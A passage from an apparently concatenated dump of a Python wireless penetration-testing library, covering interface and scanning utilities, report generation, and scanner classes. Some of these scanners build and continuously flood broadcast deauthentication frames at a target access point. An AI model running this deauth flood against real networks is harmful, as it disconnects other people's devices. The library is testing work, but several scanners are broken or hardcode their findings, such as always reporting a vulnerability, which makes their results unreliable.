    def decrypt_credentials(self, encrypted_data: str) -> dict:
        """
        Decrypts captured encrypted credentials.

        Args:
            encrypted_data (str): Encrypted credentials.

        Returns:
            dict: Decrypted credentials.
        """
        self.logger.debug("Decrypting credentials...")
        # Placeholder for decryption logic


        decrypted = {
            "username": "admin",
            "password": "password123"
        }
        self.logger.info("Credentials decrypted successfully.")
        return decrypted

    def authenticate(self, username: str, password: str) -> bool:
        """
        Authenticates the user with the provided credentials.

        Args:
            username (str): User's username.
            password (str): User's password.

        Returns:
            bool: True if authentication is successful, False otherwise.
        """
        self.logger.debug("Authenticating user...")
        # Placeholder for authentication logic
        authenticated = username == "admin" and password == "password123"
        if authenticated:
            self.logger.info("User authenticated successfully.")
        else:
            self.logger.warning("Authentication failed.")
        return authenticated

# project_specific_utils/custom_threading.py
import threading
from threading import Thread


class CustomThread(Thread):
    """

    """
    def __init__(self, func, args=(), kwargs={}):
        Thread.__init__(self)
        self.func = func
        self.args = args
        self.kwargs = kwargs

    def run(self):
        self.result = self.func(*self.args, **self.kwargs)


    def get_result(self):
        return self.result

    def set_result(self, result):
        self.result = result


# project_specific_utils/data_storage_manager.py
# wireless_pen_test_lib/project_specific_utils/data_storage_manager.py

import os
import json
import logging


class DataStorageManager:
    """
    A class to manage data storage and report generation.
    """
    def __init__(self, report_directory: str = "reports", filename="report.txt"):
        """
        Initialize the DataStorageManager with the specified report directory.

        Args:
            report_directory (str): Path to the directory where reports will be stored.
        """
        self.report_directory = report_directory
        os.makedirs(self.report_directory, exist_ok=True)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"DataStorageManager initialized for report directory: {self.report_directory}")
        self.filename = filename

    def generate_report(self, vulnerability_db: dict):
        """
        Generates a report based on the vulnerability database.

        Args:
            vulnerability_db (dict): Dictionary containing detected vulnerabilities.
        """
        self.logger.info("Generating reports...")
        # Ensure report directories exist
        json_dir = os.path.join(self.report_directory, "json")
        txt_dir = os.path.join(self.report_directory, "txt")
        os.makedirs(json_dir, exist_ok=True)
        os.makedirs(txt_dir, exist_ok=True)

        # JSON Report
        json_report_path = os.path.join(json_dir, "report.json")
        with open(json_report_path, 'w') as f:
            json.dump(vulnerability_db, f, indent=4)
        self.logger.info(f"JSON report generated at {json_report_path}")

        # TXT Report
        txt_report_path = os.path.join(txt_dir, "report.txt")
        with open(txt_report_path, 'w') as f:
            for scanner, vulnerabilities in vulnerability_db.get('scans', {}).items():
                f.write(f"Scanner: {scanner}\n")
                for vuln in vulnerabilities:
                    f.write(f"  - SSID: {vuln.get('ssid', 'N/A')}\n")
                    f.write(f"    BSSID: {vuln.get('bssid', 'N/A')}\n")
                    f.write(f"    Protocol: {vuln.get('protocol', 'N/A')}\n")
                    f.write(f"    Description: {vuln.get('description', 'N/A')}\n")
            for exploit, vulnerabilities in vulnerability_db.get('exploits', {}).items():
                f.write(f"Exploit: {exploit}\n")
                for vuln in vulnerabilities:
                    f.write(f"  - BSSID: {vuln.get('bssid', 'N/A')}\n")
                    f.write(f"    Description: {vuln.get('description', 'N/A')}\n")
                    f.write(f"    Action: {vuln.get('action', 'N/A')}\n")
        self.logger.info(f"TXT report generated at {txt_report_path}")


if __name__=="__main__":
    dsm = DataStorageManager()
    dsm.generate_report({
        'scans': {
            'WEPScanner': [
                {
                    'ssid': 'TestNet',
                    'bssid': '00:11:22:33:44:55',
                    'protocol': 'WEP',
                    'description': 'Weak WEP key detected.'
                }
            ]
        },
        'exploits': {
            'DeauthExploit': [
                {
                    'bssid': '00:11:22:33:44:55',
                    'description': 'Deauth attack successful.',
                    'action': 'Disconnect the client.'
                }
            ]
        }
    })
    print("Report generation completed.")

# project_specific_utils/network_interface_manager.py
# wireless_pen_test_lib/project_specific_utils/network_interface_manager.py

import subprocess
import logging

class NetworkInterfaceManager:
    """
    A class to manage network interfaces.
    """
    def __init__(self, interface: str = "wlan0mon"):
        """
        Initialize the NetworkInterfaceManager with the specified interface.

        Args:
            interface (str): Name of the wireless interface.
        """
        if not self.is_valid_interface(interface):
            raise ValueError(f"Invalid network interface: {interface}")
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"NetworkInterfaceManager initialized for interface: {self.interface}")

    def is_valid_interface(self, interface: str) -> bool:
        available_interfaces = self.get_available_interfaces()
        return interface in available_interfaces

    def get_available_interfaces(self) -> list:
        # This should be replaced with actual system call to list interfaces
        return ['wlan0mon', 'eth0', 'lo']

    def get_interface_mac(self) -> str:
        """
        Retrieves the MAC address of the wireless interface.

        Returns:
            str: MAC address of the interface.
        """
        try:
            result = subprocess.check_output(["ifconfig", self.interface], stderr=subprocess.STDOUT).decode()
            mac_address = result.split("ether ")[1].split(" ")[0]
            return mac_address
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to get MAC address: {e.output.decode()}")
            return "00:00:00:00:00:00"

    def set_monitor_mode(self):
        """
        Sets the wireless interface to monitor mode.
        """
        self.logger.info(f"Setting interface {self.interface} to monitor mode.")
        try:
            subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "monitor"], check=True)
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            self.logger.info(f"Interface {self.interface} set to monitor mode successfully.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode: {e}")
            raise e

    def set_managed_mode(self):
        """
        Sets the wireless interface to managed mode.
        """
        self.logger.info(f"Setting interface {self.interface} to managed mode.")
        try:
            subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "managed"], check=True)
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            self.logger.info(f"Interface {self.interface} set to managed mode successfully.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set managed mode: {e}")
            raise e

    def get_interface_status(self) -> str:
        """
        Retrieves the current status of the wireless interface.

        Returns:
            str: Current mode of the interface (e.g., Monitor, Managed).
        """
        try:
            result = subprocess.check_output(["iwconfig", self.interface], stderr=subprocess.STDOUT).decode()
            if "Mode:Monitor" in result:
                return "Monitor Mode"
            elif "Mode:Managed" in result:
                return "Managed Mode"
            else:
                return "Unknown Mode"
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to get interface status: {e.output.decode()}")
            return "Unknown Mode"

# project_specific_utils/network_scanner.py
#!/usr/bin/env python3
import subprocess
import re
from scapy.all import srp, conf
from scapy.layers.l2 import ARP, Ether
import netifaces
import sys
import logging
import argparse

# Configure logging
logger = logging.getLogger('NetworkScanner')

def setup_logging(level):
    """
    Sets up logging with the specified level.
    """
    numeric_level = getattr(logging, level.upper(), None)
    if not isinstance(numeric_level, int):
        print(f"Invalid log level: {level}")
        sys.exit(1)
    logging.basicConfig(
        level=numeric_level,
        format='[%(asctime)s] %(levelname)s - %(name)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )

def scan_wireless_networks(interface='wlan0'):
    """
    Scans for wireless networks using iwlist.

    Args:
        interface (str): The wireless interface to scan.

    Returns:
        List[dict]: A list of dictionaries containing SSID, BSSID, Signal Level, and Channel.
    """
    logger.info(f"Scanning for wireless networks on interface: {interface}")
    try:
        # Execute iwlist scan command
        scan_output = subprocess.check_output(['iwlist', interface, 'scanning'], stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to execute iwlist: {e.output}")
        return []

    # Parse the output
    cells = scan_output.split('Cell ')
    networks = []

    for cell in cells[1:]:
        ssid_search = re.search(r'ESSID:"(.*)"', cell)
        ssid = ssid_search.group(1) if ssid_search else 'Hidden'

        bssid_search = re.search(r'Address: ([\w:]+)', cell)
        bssid = bssid_search.group(1) if bssid_search else 'Unknown'

        signal_search = re.search(r'Signal level=(-?\d+) dBm', cell)
        signal = signal_search.group(1) + ' dBm' if signal_search else 'N/A'

        channel_search = re.search(r'Channel:(\d+)', cell)
        channel = channel_search.group(1) if channel_search else 'N/A'

        networks.append({
            'SSID': ssid,
            'BSSID': bssid,
            'Signal': signal,
            'Channel': channel
        })

    logger.info(f"Found {len(networks)} wireless networks.")
    return networks

def get_default_gateway_ip():
    """
    Retrieves the default gateway IP address.

    Returns:
        str: The default gateway IP.
    """
    gateways = netifaces.gateways()
    default_gateway = gateways.get('default')
    if default_gateway is None:
        logger.error("No default gateway found.")
        sys.exit(1)
    gateway_ip = default_gateway[netifaces.AF_INET][0]
    return gateway_ip

def get_network_prefix(interface):
    """
    Retrieves the network prefix (e.g., 192.168.1.0/24).

    Args:
        interface (str): The network interface.

    Returns:
        str: The network prefix.
    """
    addrs = netifaces.ifaddresses(interface)
    inet = addrs.get(netifaces.AF_INET)
    if not inet:
        logger.error(f"No IPv4 address found for interface {interface}.")
        sys.exit(1)
    ip_info = inet[0]
    ip_address = ip_info.get('addr')
    netmask = ip_info.get('netmask')
    if not ip_address or not netmask:
        logger.error(f"IP address or netmask not found for interface {interface}.")
        sys.exit(1)
    # Calculate CIDR notation
    cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
    network_prefix = f"{ip_address}/{cidr}"
    return network_prefix

def scan_local_network(interface='eth0'):
    """
    Scans the local network for active devices using ARP requests.

    Args:
        interface (str): The network interface to use for scanning.

    Returns:
        List[dict]: A list of dictionaries containing IP and MAC addresses.
    """
    logger.info(f"Scanning local network on interface: {interface}")
    network = get_network_prefix(interface)
    logger.debug(f"Network prefix: {network}")

    # Create ARP packet
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Disable verbose in scapy
    conf.verb = 0

    try:
        result = srp(packet, timeout=3, iface=interface, inter=0.1)[0]
    except Exception as e:
        logger.error(f"Error during ARP scan: {e}")
        return []

    devices = []
    for sent, received in result:
        devices.append({
            'IP': received.psrc,
            'MAC': received.hwsrc
        })

    logger.info(f"Found {len(devices)} devices on the local network.")
    return devices

def get_active_interfaces():
    """
    Retrieves active network interfaces.

    Returns:
        List[str]: A list of active network interface names.
    """
    interfaces = netifaces.interfaces()
    active_interfaces = []
    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            active_interfaces.append(interface)
    return active_interfaces

def display_wireless_networks(networks):
    """
    Displays the list of wireless networks.

    Args:
        networks (List[dict]): List of wireless networks.
    """
    if not networks:
        logger.info("No wireless networks found.")
        return

    print("\n=== Wireless Networks ===")
    print(f"{'SSID':<30} {'BSSID':<20} {'Signal':<10} {'Channel':<8}")
    print("-" * 70)
    for net in networks:
        print(f"{net['SSID']:<30} {net['BSSID']:<20} {net['Signal']:<10} {net['Channel']:<8}")

def display_local_devices(devices):
    """
    Displays the list of devices on the local network.

    Args:
        devices (List[dict]): List of devices with IP and MAC addresses.
    """
    if not devices:
        logger.info("No devices found on the local network.")
        return

    print("\n=== Local Network Devices ===")
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print("-" * 40)
    for device in devices:
        print(f"{device['IP']:<20} {device['MAC']:<20}")

def parse_arguments():
    """
    Parses command-line arguments.

    Returns:
        argparse.Namespace: Parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Network Devices Scanner Utility")
    parser.add_argument(
        '-w', '--wireless-interface',
        type=str,
        default=None,
        help="Specify the wireless interface to scan (e.g., wlan0). If not provided, the script will auto-detect."
    )
    parser.add_argument(
        '-e', '--ethernet-interface',
        type=str,
        default=None,
        help="Specify the Ethernet interface to scan (e.g., eth0). If not provided, the script will auto-detect."
    )
    parser.add_argument(
        '-l', '--log-level',
        type=str,
        default='INFO',
        help="Set the logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL). Default is INFO."
    )
    return parser.parse_args()

def main():
    args = parse_arguments()
    setup_logging(args.log_level)

    # Determine active wireless interface
    active_interfaces = get_active_interfaces()
    wireless_interfaces = [iface for iface in active_interfaces if 'wlan' in iface]

    if args.wireless_interface:
        wireless_interface = args.wireless_interface
        if wireless_interface not in wireless_interfaces:
            logger.error(f"Specified wireless interface '{wireless_interface}' is not active or not found.")
            sys.exit(1)
    else:
        if not wireless_interfaces:
            logger.error("No wireless interfaces found. Ensure your wireless adapter is connected.")
            sys.exit(1)
        wireless_interface = wireless_interfaces[0]

    networks = scan_wireless_networks(interface=wireless_interface)
    display_wireless_networks(networks)

    # Determine active Ethernet interface for local network scan
    ethernet_interfaces = [iface for iface in active_interfaces if 'eth' in iface or 'enp' in iface or 'eno' in iface]
    if args.ethernet_interface:
        ethernet_interface = args.ethernet_interface
        if ethernet_interface not in ethernet_interfaces:
            logger.error(f"Specified Ethernet interface '{ethernet_interface}' is not active or not found.")
            sys.exit(1)
    else:
        if not ethernet_interfaces:
            logger.error("No Ethernet interfaces found. Ensure you are connected to a network.")
            sys.exit(1)
        ethernet_interface = ethernet_interfaces[0]

    devices = scan_local_network(interface=ethernet_interface)
    display_local_devices(devices)

if __name__ == "__main__":
    main()


# project_specific_utils/save_project_files_to_txt_file.py
import os
import sys
import argparse
import logging


def setup_logging(verbosity):
    """
    Set up logging configuration based on verbosity level.
    """
    log_levels = {
        0: logging.ERROR,
        1: logging.WARNING,
        2: logging.INFO,
        3: logging.DEBUG
    }
    level = log_levels.get(verbosity, logging.DEBUG)

    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )


def get_default_exclusions():
    """
    Returns a set of default directory names to exclude from processing.
    """
    return {
        '.venv', 'venv', 'env', 'ENV', '__pycache__', 'site-packages',
        'build', 'dist', '.git', '.svn', '.hg', '.idea', '.mypy_cache',
        '.pytest_cache', '.tox', '.eggs', 'egg-info'
    }


def collect_py_files(project_dir, output_file, exclude_dirs):
    """
    Walk through the project directory recursively, find all .py files
    excluding specified directories, and append their contents to the
    output_file with the filename as a comment.
    """
    try:
        with open(output_file, 'w', encoding='utf-8') as outfile:
            logging.info(f"Opened output file: {output_file} for writing.")
            for root, dirs, files in os.walk(project_dir):
                logging.debug(f"Walking through directory: {root}")

                # Modify dirs in-place to exclude unwanted directories
                dirs_to_remove = [d for d in dirs if d in exclude_dirs]
                for d in dirs_to_remove:
                    dirs.remove(d)
                    logging.debug(f"Excluded directory from traversal: {d}")

                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        relative_path = os.path.relpath(file_path, project_dir)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as infile:
                                content = infile.read()
                            # Write the filename as a comment
                            outfile.write(f"# {relative_path}\n")
                            logging.debug(f"Writing header for file: {relative_path}")
                            # Write the file content
                            outfile.write(content + "\n\n")
                            logging.info(f"Appended: {relative_path}")
                        except FileNotFoundError:
                            logging.error(f"File not found: {file_path}")
                        except PermissionError:
                            logging.error(f"Permission denied: {file_path}")
                        except Exception as e:
                            logging.error(f"Failed to read {file_path}: {e}")
        logging.info(f"Successfully wrote to output file: {output_file}")
    except PermissionError:
        logging.critical(f"Permission denied when trying to write to output file: {output_file}")
        sys.exit(1)
    except Exception as e:
        logging.critical(f"An unexpected error occurred while opening the output file: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Recursively collect all user-created .py files in a project and append their contents to a single .txt file."
    )
    parser.add_argument(
        'project_directory',
        nargs='?',
        default='.',
        help='Path to the Python project directory (default: current directory)'
    )
    parser.add_argument(
        '-o', '--output',
        default='combined_py_files.txt',
        help='Name of the output .txt file (default: combined_py_files.txt)'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='count',
        default=2,
        help='Increase output verbosity (e.g., -v, -vv, -vvv)'
    )
    parser.add_argument(
        '-e', '--exclude',
        nargs='*',
        default=[],
        help='Additional directories to exclude from processing (space-separated)'
    )

    args = parser.parse_args()

    setup_logging(args.verbose)

    project_dir = os.path.abspath(args.project_directory)
    output_file = os.path.abspath(args.output)

    logging.info(f"Project Directory: {project_dir}")
    logging.info(f"Output File: {output_file}\n")

    if not os.path.isdir(project_dir):
        logging.critical(f"The specified project directory does not exist or is not a directory: {project_dir}")
        sys.exit(1)

    # Combine default exclusions with user-specified exclusions
    exclude_dirs = get_default_exclusions().union(set(args.exclude))
    logging.debug(f"Directories to exclude: {exclude_dirs}")

    collect_py_files(project_dir, output_file, exclude_dirs)

    logging.info("\nAll .py files have been processed.")
    logging.info(f"Combined file saved as: {output_file}")


if __name__ == "__main__":
    main()


# project_specific_utils/__init__.py


# scanners/auth_bypass_scanner.py
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scanners.base_scanner import BaseScanner
from scapy.all import sendp, sniff
import time
import logging
from threading import Thread

class AuthBypassScanner(BaseScanner):
    """
    A scanner to detect authentication bypass vulnerabilities in wireless networks.
    """
    def __init__(self, core_framework, scan_duration: int = 10):
        """
        Initialize the AuthBypassScanner with core framework and scan duration.

        Args:
            core_framework (CoreFramework): Instance of CoreFramework.
            scan_duration (int): Duration to run the scan in seconds.
        """
        super().__init__(core_framework, scan_duration)
        self.detected_vulnerabilities = []
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"AuthBypassScanner initialized with scan duration: {self.scan_duration} seconds.")
        self.core_framework = core_framework
        self.scan_duration = scan_duration

    def scan(self, target):
        """
        Scans the target network for authentication bypass vulnerabilities.
        """
        self.logger.info(f"Starting Authentication Bypass Scan on target: {target}")

        bssid = target.get('bssid')
        if not bssid:
            self.logger.error("Target BSSID not specified.")
            return

        self.logger.info(f"Sending deauthentication frames to BSSID: {bssid}")

        # Construct the deauthentication packet
        deauth_pkt = RadioTap() / Dot11(
            addr1='FF:FF:FF:FF:FF:FF',  # Broadcast
            addr2=self.core_framework.network_manager.get_interface_mac(),  # Attacker MAC
            addr3=bssid  # Target AP BSSID
        ) / Dot11Deauth(reason=7)

        # Start monitoring client behavior in a separate thread
        self.logger.info("Monitoring client behavior for authentication bypass detection.")
        stop_sniffing = False

        def monitor_clients(packet):
            """
            Callback function to monitor packets for signs of authentication bypass.
            """
            nonlocal stop_sniffing

            if packet.haslayer(Dot11):
                # Check if the packet is a probe request or reauthentication attempt
                client_mac = packet.addr2
                if client_mac and packet.type == 0 and packet.subtype in [4, 11]:  # Probe Request or Authentication
                    self.logger.info(f"Client {client_mac} attempting to reconnect.")
                elif client_mac:
                    self.logger.warning(f"Client {client_mac} appears to have disconnected unexpectedly.")

            return not stop_sniffing

        # Start packet sniffing in a separate thread
        sniff_thread = Thread(target=sniff, kwargs={
            'prn': monitor_clients,
            'timeout': self.scan_duration,
            'store': False,
        }, daemon=True)
        sniff_thread.start()

        # Launch deauthentication attack
        self.core_framework.send_continuous_packets(deauth_pkt, interval=0.1)

        # Allow the attack to run for the specified duration
        time.sleep(self.scan_duration)
        self.core_framework.stop_continuous_packets()

        # Stop sniffing and wait for the thread to finish
        stop_sniffing = True
        sniff_thread.join()

        # Analyze results
        # This placeholder logic simulates detection of a vulnerability if no reauthentication packets were observed
        # during the monitoring period.
        vulnerability_detected = True  # Replace with actual analysis logic
        if vulnerability_detected:
            vulnerability = {
                'type': 'Authentication Bypass',
                'description': 'Clients failed to properly reauthenticate after deauthentication frames were sent.',
                'bssid': bssid,
                'action': 'Ensure strong authentication mechanisms are implemented.'
            }
            self.detected_vulnerabilities.append(vulnerability)
            self.core_framework.vulnerability_db.setdefault('AUTH_BYPASS', []).append(vulnerability)
            self.logger.warning(f"Authentication Bypass Vulnerability Detected: {vulnerability}")
        else:
            self.logger.info("No Authentication Bypass Vulnerabilities Detected.")

        return {"scans": {"auth_bypass_scanner": self.detected_vulnerabilities}}

    def report(self):
        """
        Generates a report of detected authentication bypass vulnerabilities.
        """
        self.logger.info("Generating Authentication Bypass Scan Report...")
        if not self.detected_vulnerabilities:
            self.logger.info("No authentication bypass vulnerabilities detected.")
            return

        print("\n=== Authentication Bypass Scan Report ===")
        for vuln in self.detected_vulnerabilities:
            print(f"- BSSID: {vuln['bssid']}")
            print(f"  Description: {vuln['description']}")
            print(f"  Action: {vuln['action']}\n")

    def finalize(self):
        """
        Finalizes the authentication bypass scan and performs cleanup.
        """
        self.logger.info("Finalizing Authentication Bypass Scan...")
        # Perform any cleanup or finalization steps
        pass


# scanners/base_scanner.py
# scanners/base_scanner.py

import logging

class BaseScanner:
    """
    A base class for scanners.
    """
    def __init__(self, core_framework, scan_duration: int = 10):
        """
        Initialize the BaseScanner with core framework and scan duration.

        Args:
            core_framework (CoreFramework): Instance of CoreFramework.
            scan_duration (int): Duration to run the scan in seconds.
        """
        self.core_framework = core_framework
        self.scan_duration = scan_duration
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"{self.__class__.__name__} initialized with scan duration: {self.scan_duration} seconds.")

    def scan(self, target_info: dict) -> dict:
        """
        Perform the scan on the target.

        Args:
            target_info (dict): Information about the target.

        Returns:
            dict: Detected vulnerabilities.
        """
        self.logger.info(f"Scanning target: {target_info}")
        # Placeholder for scan logic
        vulnerabilities = {}
        return vulnerabilities


# scanners/client_discovery.py
# wireless_pen_test_lib/scanners/client_discovery.py

import threading
import logging
from scapy.all import sniff
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt

class ClientDiscovery:

    """
    Discovers clients connected to wireless networks by sniffing data frames.
    """
    def __init__(self, interface, bssid_list, timeout=10):
        """
        Initializes the ClientDiscovery scanner.

        Args:
            interface (str): Network interface in monitor mode.
            bssid_list (list): List of BSSIDs to monitor.
            timeout (int): Duration to run the discovery in seconds.
        """
        self.interface = interface
        self.bssid_list = [bssid.lower() for bssid in bssid_list]
        self.timeout = timeout
        self.clients = {bssid: set() for bssid in self.bssid_list}
        self.logger = logging.getLogger(self.__class__.__name__)

    def _packet_handler(self, packet):
        if packet.haslayer(Dot11):
            bssid = packet[Dot11].addr3.lower()
            if bssid in self.bssid_list:
                client_mac = packet[Dot11].addr1.lower()
                if client_mac and client_mac not in self.clients[bssid]:
                    self.clients[bssid].add(client_mac)
                    self.logger.debug(f"Discovered Client: {client_mac} on BSSID: {bssid}")

    def scan(self):
        """
        Starts the client discovery process.

        Returns:
            dict: A dictionary mapping BSSIDs to sets of client MAC addresses.
        """
        self.logger.info(f"Starting client discovery on interface {self.interface} for {self.timeout} seconds.")
        try:
            sniff(iface=self.interface, prn=self._packet_handler, timeout=self.timeout, store=False)
            for bssid, clients in self.clients.items():
                self.logger.info(f"BSSID {bssid} has {len(clients)} clients.")
            return self.clients
        except Exception as e:
            self.logger.exception(f"Error during client discovery: {e}")
            return self.clients


# scanners/dos_scanner.py
# scanners/dos_scanner.py

import time
from asyncio import timeout
from ipaddress import ip_address
from random import random
from threading import Thread, Event
from typing import Dict, Any, Optional
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.all import srp
from scapy.layers.l2 import ARP
from scapy.layers.l2 import Ether
from scanners.base_scanner import BaseScanner


class DosScanner(BaseScanner):
    """
    A scanner to detect Denial-of-Service (DoS) vulnerabilities in wireless networks.
    """
    def __init__(
        self,
        core_framework,
        vulnerability_db: Dict[str, Any],
        gui_update_callback: Optional[Any] = None
    ):
        """
        Initialize the DosScanner with CoreFramework, vulnerability database, and GUI callback.

        Args:
            core_framework (CoreFramework): An instance of CoreFramework.
            vulnerability_db (Dict[str, Any]): The vulnerability database.
            gui_update_callback (Optional[Any], optional): Callback function to update the GUI. Defaults to None.
        """
        super().__init__(core_framework, vulnerability_db)
        self.detected_vulnerabilities = []
        self.gui_update_callback = gui_update_callback  # Callback to update GUI
        self.stop_monitoring_event = Event()
        self.logger = self.core_framework.logger.getChild(self.__class__.__name__)
        self.logger.info("DosScanner initialized.")


    def scan(self, target: Dict[str, Any]):
        """
        Scans the target network for Denial-of-Service vulnerabilities by sending deauthentication frames.

        Args:
            target (Dict[str, Any]): Information about the target device.
        """
        self.logger.info(f"Starting DoS Scan on target: {target}")

        bssid = target.get('bssid')
        if not bssid:
            self.logger.error("Target BSSID not specified.")
            self.update_feedback("Target BSSID not specified for DoS scan.")
            return

        # Start monitoring the network stability in a separate thread
        monitor_thread = Thread(target=self.monitor_network_stability, args=(bssid,), daemon=True)
        monitor_thread.start()

        # Start DoS attack: flood deauthentication frames
        self.logger.info(f"Sending deauthentication frames to BSSID: {bssid} to test DoS vulnerability.")
        deauth_pkt = RadioTap() / Dot11(
            addr1='FF:FF:FF:FF:FF:FF',
            addr2=self.core_framework.network_manager.get_interface_mac(),
            addr3=bssid
        ) / Dot11Deauth(reason=7)

        attack_duration = 10  # seconds

        # Start sending packets in a separate thread to avoid blocking
        attack_thread = Thread(
            target=self.core_framework.send_continuous_packets,
            args=(deauth_pkt, 0.05),
            daemon=True
        )
        attack_thread.start()

        self.logger.info(f"Running DoS attack for {attack_duration} seconds...")
        self.update_feedback(f"DoS attack initiated on BSSID {bssid}.")

        time.sleep(attack_duration)

        # Stop the attack and monitoring
        self.core_framework.stop_continuous_packets()
        self.stop_monitoring_event.set()  # Signal the monitoring thread to stop
        monitor_thread.join()

        # Evaluate results and check if vulnerability was detected
        if 'DOS_VULNERABILITY' in self.vulnerability_db:
            vulnerability = {
                'type': 'Denial-of-Service',
                'description': 'The network is susceptible to DoS attacks via deauthentication frame flooding.',
                'bssid': bssid,
                'action': 'Implement measures to mitigate DoS attacks, such as client-side protections.'
            }
            self.detected_vulnerabilities.append(vulnerability)
            self.logger.warning(f"Denial-of-Service Vulnerability Detected: {vulnerability}")
            # Optional: Update GUI to show detected vulnerability
            if self.gui_update_callback:
                self.gui_update_callback(f"DoS Vulnerability Detected on BSSID: {bssid}")

    def monitor_network_stability(self, bssid: str):
        """
        Monitors network stability during the DoS attack to detect disruptions.
        Sends feedback to GUI and logs potential vulnerabilities.

        Args:
            bssid (str): The BSSID of the target device.
        """
        self.logger.info(f"Monitoring network stability for BSSID: {bssid}...")
        while not self.stop_monitoring_event.is_set():
            # Check if target is reachable (e.g., simulate ping or connectivity check)
            target_reachable = self.is_target_reachable(bssid)

            if target_reachable:
                status = f"Target BSSID {bssid} is stable."
            else:
                status = f"Disruption detected on BSSID {bssid} (possible DoS)."
                self.logger.warning(status)

            # Update GUI with real-time feedback
            if self.gui_update_callback:
                self.gui_update_callback(status)

            time.sleep(1)  # Adjust interval for monitoring frequency

    def is_target_reachable(self, bssid: str) -> bool:
        """
        Placeholder for checking if target is reachable (connectivity check).
        In a real implementation, this might involve ARP requests or ping-like tests.

        Args:
            bssid (str): The BSSID of the target device.

        Returns:
            bool: True if reachable, False otherwise.
        """

        # define target
        target = {
            'ssid': '',
            'bssid': bssid,
            'ip_address': None,
            'ports': [],
            'mac_address': None
        }

        # Construct packet
        self.logger.info(f"Constructing packet for target {str(target.ssid)}")
        arp_frame = ARP(dst=target['ip_address'])
        eth_frame = Ether(dst=target['mac_address'])
        packet = eth_frame / arp_frame
        self.logger.info(f"{str(packet)} Created")

        # send packet
        response = srp(packet, timeout=2, verbose=True)
        if response:
            return False


    def update_feedback(self, message: str):
        """
        Updates the GUI with feedback messages.

        Args:
            message (str): The message to display.
        """
        if self.gui_update_callback:
            self.gui_update_callback(message)


# scanners/encryption_analysis.py
# wireless_pen_test_lib/scanners/encryption_analysis.py

import logging

class EncryptionAnalysis:
    """
    Analyzes the encryption and authentication mechanisms of wireless networks.
    """
    def __init__(self, networks):
        """
        Initializes the EncryptionAnalysis.

        Args:
            networks (dict): Dictionary of networks with their details.
        """
        self.networks = networks
        self.logger = logging.getLogger(self.__class__.__name__)
        self.analysis_results = {}

    def analyze(self):
        """
        Analyzes encryption types and identifies potential vulnerabilities.

        Returns:
            dict: Analysis results with vulnerabilities identified.
        """
        self.logger.info("Starting encryption and authentication analysis.")
        for bssid, details in self.networks.items():
            encryption = details.get("Encryption", "Unknown")
            vulnerabilities = []

            if encryption in ["WEP"]:
                vulnerabilities.append("WEP is deprecated and vulnerable to multiple attacks.")
            elif encryption in ["WPA"]:
                vulnerabilities.append("WPA has known vulnerabilities like TKIP attacks.")
            elif encryption in ["WPA2"]:
                vulnerabilities.append("Ensure WPA2 uses strong cipher suites like AES.")
            elif encryption in ["WPA3"]:
                vulnerabilities.append("WPA3 is the latest and more secure, but verify implementation.")

            self.analysis_results[bssid] = {
                "SSID": details.get("SSID"),
                "Encryption": encryption,
                "Vulnerabilities": vulnerabilities
            }

            if vulnerabilities:
                self.logger.warning(f"Network {bssid} ({details.get('SSID')}) has vulnerabilities: {vulnerabilities}")
            else:
                self.logger.info(f"Network {bssid} ({details.get('SSID')}) appears secure.")

        self.logger.info("Encryption and authentication analysis completed.")
        return self.analysis_results


# scanners/encryption_scanner.py
# wireless_pen_test_lib/scanners/encryption_scanner.py

import time
from .base_scanner import BaseScanner
import logging


class EncryptionWeaknessScanner(BaseScanner):
    """
    A scanner to detect encryption weaknesses in wireless networks.
    """
    def __init__(self, scan_duration: int = 15):
        """
        Initialize the EncryptionWeaknessScanner with a scan duration.

        Args:
            scan_duration (int): Duration to run the scan in seconds.
        """
        super().__init__(scan_duration)
        self.detected_vulnerabilities = []

    def scan(self, target_info: dict) -> dict:
        """
        Perform the encryption weakness scan on the target.

        Args:
            target_info (dict): Information about the target.

        Returns:
            dict: Detected vulnerabilities.
        """
        self.logger.info(f"Starting Encryption Weakness Scan on target: {target_info}")
        time.sleep(self.scan_duration)  # Simulate scanning duration
        # Placeholder for actual scanning logic
        vulnerability = {
            "ssid": target_info.get('ssid', 'N/A'),
            "bssid": target_info.get('bssid', 'N/A'),
            "protocol": "WEP",
            "description": "Weak encryption detected.",
            "action": "Upgrade to WPA2."
        }
        self.detected_vulnerabilities.append(vulnerability)
        self.logger.info("Encryption Weakness Scan completed.")
        return {"scans": {"encryption_scanner": self.detected_vulnerabilities}}

# scanners/firmware_vulnerability_scan.py
